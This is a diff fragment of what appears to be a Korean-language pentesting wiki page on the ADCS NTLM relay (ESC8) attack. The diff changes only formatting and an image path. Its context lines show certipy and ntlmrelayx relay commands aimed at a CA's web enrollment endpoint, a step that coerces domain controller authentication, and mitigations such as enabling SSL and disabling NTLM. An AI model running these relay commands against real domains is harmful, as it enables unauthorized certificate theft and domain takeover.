@@ -47,7 +47,8 @@ $ curl -k http://192.168.40.150/certsrv/certfnsh.asp
 <strong>certipy relay -ca &#x3C;ca-ip> 
 </strong>
 # ntlmrelayx 
-python3 ntlmrelayx.py -t http://&#x3C;CA-IP or FDQN>/certsrv/certfnsh.asp -smb2support --adcs --template &#x3C;template></code></pre>
+python3 ntlmrelayx.py -t http://&#x3C;CA-IP or FDQN>/certsrv/certfnsh.asp -smb2support --adcs --template &#x3C;template>
+</code></pre>
 
 4\. 강제 인증, LLMNR/NBT-NS, MITM6 등을 이용해 도메인 컨트롤러를 공격해 NTLM Relay 공격을 실행한다.&#x20;
 
@@ -116,7 +117,7 @@ $ certipy auth -dc-ip <dc-IP> -pfx real.pfx
 
 1-1. 그 이 SSL을 활성화 한다.&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 2\. 극단적으로 CA 서버에 NTLM 인증을 비활성화 한다. 프로덕션 서버의 경우 하위 호환성에 문제가 갈 수 있기 때문에 충분한 테스트를 거친 뒤 NTLM 인증을 비활성화 한다.  \
 &#x20;
